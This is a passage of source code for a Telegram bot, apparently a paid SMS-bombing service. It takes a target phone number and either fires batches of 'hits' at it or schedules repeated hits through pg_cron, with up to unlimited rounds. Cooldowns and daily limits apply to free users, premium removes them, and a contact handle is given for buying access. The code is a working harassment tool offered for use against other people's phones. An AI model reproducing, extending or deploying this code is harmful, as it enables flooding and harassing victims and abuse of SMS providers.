            inline_keyboard: [[{ text: '🔁 Same Service', callback_data: `custom_sms_service:${service}` }], [{ text: '📲 All Services', callback_data: 'custom_sms' }], [{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
          });
        } catch (err) {
          await sendMessage(chatId, `❌ <b>Error:</b> ${err instanceof Error ? err.message : 'Unknown'}`, {
            inline_keyboard: [[{ text: '📲 All Services', callback_data: 'custom_sms' }], [{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
          });
        }
        return new Response('OK', { headers: corsHeaders });
      }

      // ===== Schedule Phone Handling =====
      if (state?.waiting_schedule_phone) {
        const parts = text.split(/\s+/);
        const phone = parts[0].replace(/[^0-9+]/g, '');
        if (!/^\+?[0-9]{10,15}$/.test(phone)) {
          await sendMessage(chatId, '❌ <b>Invalid number!</b>\n\n<code>9876543210 60 10</code>');
          return new Response('OK', { headers: corsHeaders });
        }
        const intervalSec = parseInt(parts[1]) || 60;
        const maxRounds = parseInt(parts[2]) || 0;
        const now = new Date().toISOString();
        await supabase.from('scheduled_hits').insert({
          phone_number: phone, start_time: now, interval_seconds: Math.max(10, Math.min(intervalSec, 3600)),
          max_rounds: maxRounds > 0 ? maxRounds : null, is_active: true, next_execution_at: now,
        });
        await setBotState(chatId, { waiting_schedule_phone: false });
        await sendMessage(chatId, `✅ <b>Schedule Created!</b>\n\n📱 Number: <code>${phone}</code>\n⏱️ Interval: <b>${Math.max(10, Math.min(intervalSec, 3600))}s</b>\n🔄 Max Rounds: <b>${maxRounds > 0 ? maxRounds : '♾️ Unlimited'}</b>\n\n<i>Schedule ab active hai. pg_cron se automatic execute hoga.</i>`, {
          inline_keyboard: [[{ text: '📋 My Schedules', callback_data: 'schedule_list' }], [{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
        });
        return new Response('OK', { headers: corsHeaders });
      }

      // ===== Phone Number Handling =====
      if (state?.waiting_phone || /^\+?\d{10,15}(\s+\d+)*$/.test(text)) {
        const parts = text.split(/\s+/);
        const phone = parts[0].replace(/[^0-9+]/g, '');
        if (!/^\+?[0-9]{10,15}$/.test(phone)) {
          await sendMessage(chatId, '❌ <b>Invalid number!</b>\n\n<code>9876543210</code> ya <code>+919876543210</code>');
          return new Response('OK', { headers: corsHeaders });
        }

        if (!ctx.premium.isPremium && !admin) {
          const cooldown = await getCooldownRemaining(chatId, ctx.config);
          if (cooldown > 0) {
            const mins = Math.ceil(cooldown / 60000);
            const secs = Math.ceil(cooldown / 1000);
            await sendMessage(chatId, `⏳ <b>Cooldown Active!</b>\n\n${mins > 1 ? `${mins} minute` : `${secs} second`} baad try karo.\n\n💎 Premium = No Cooldown!`);
            return new Response('OK', { headers: corsHeaders });
          }
          if (ctx.usage.today >= ctx.config.dailyLimit) {
            const usedToday = Math.min(ctx.usage.today, ctx.config.dailyLimit);
            await sendMessage(chatId, `❌ <b>Daily limit reached!</b> (${usedToday}/${ctx.config.dailyLimit})\n\n💎 Premium le lo unlimited access ke liye.\n💬 Contact: @xyzdark62`);
            return new Response('OK', { headers: corsHeaders });
          }
        }

        const batch = parseInt(parts[1]) || ctx.config.defaultBatch;
        const delay = parseInt(parts[2]) || ctx.config.defaultDelay;
        await runHitsForPhone(chatId, phone, 1, Math.min(batch, 20), Math.min(delay, 60));
        return new Response('OK', { headers: corsHeaders });
      }

      // Default
      await sendMessage(chatId, '👋 /start bhejo ya /help dekho!');
    }

    return new Response('OK', { headers: corsHeaders });
  } catch (error) {
    console.error('Bot error:', error);
    return new Response(JSON.stringify({ error: 'Internal error' }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
